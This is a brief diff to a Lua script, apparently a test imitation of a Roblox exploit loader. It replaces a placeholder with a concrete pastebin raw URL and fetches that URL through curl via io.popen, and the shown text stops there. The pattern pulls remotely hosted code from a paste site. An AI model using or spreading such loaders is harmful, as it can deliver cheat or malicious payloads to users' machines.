@@ -1,5 +1,5 @@
 -- This acts exactly like a Roblox exploit loader
-local pastebinURL = "https://pastebin.com/raw/XXXXXX"
+local pastebinURL = "https://pastebin.com/raw/7afQYE9L"
 
 -- We simulate HttpGet using a quick terminal trick for testing
 local handle = io.popen("curl -s " .. pastebinURL)
